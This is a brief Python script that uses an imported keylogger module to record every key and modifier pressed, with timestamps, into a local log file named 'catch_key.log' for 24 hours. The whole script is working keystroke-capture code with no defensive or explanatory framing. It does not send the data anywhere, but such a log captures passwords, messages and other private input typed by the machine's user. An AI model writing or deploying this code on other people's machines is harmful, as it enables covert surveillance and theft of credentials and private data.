# -*- coding:utf-8 -*-

import logging
import os
import time

import keylogger

curr_path = os.path.dirname(os.path.abspath(__file__))


def get_logger():
    fmt = "%(asctime)-15s %(levelname)s %(filename)s %(lineno)d %(process)d %(message)s"
    datefmt = "%a %d %b %Y %H:%M:%S"
    formatter = logging.Formatter(fmt, datefmt)

    filename = 'catch_key.log'
    filepath = os.path.join(curr_path, filename)
    fh = logging.FileHandler(filepath, mode='a', encoding=None, delay=False)
    fh.setLevel(logging.INFO)
    fh.setFormatter(formatter)

    logger_name = 'Catch-Key'
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    logger.addHandler(fh)
    
    return logger


logger = get_logger()


def recoding_keys(t, modifiers, keys):
    if keys:
        date = "{}  {}".format(t, keys)
        logger.info(date)
    else:
        for key, value in modifiers.items():
            if value:
                date = "{}  {}".format(t, key)
                logger.info(date)
                break


if __name__ == "__main__":
    now = time.time()
    when_stop = lambda: time.time() > now + 60 * 60 * 24
    keylogger.log(when_stop, recoding_keys)
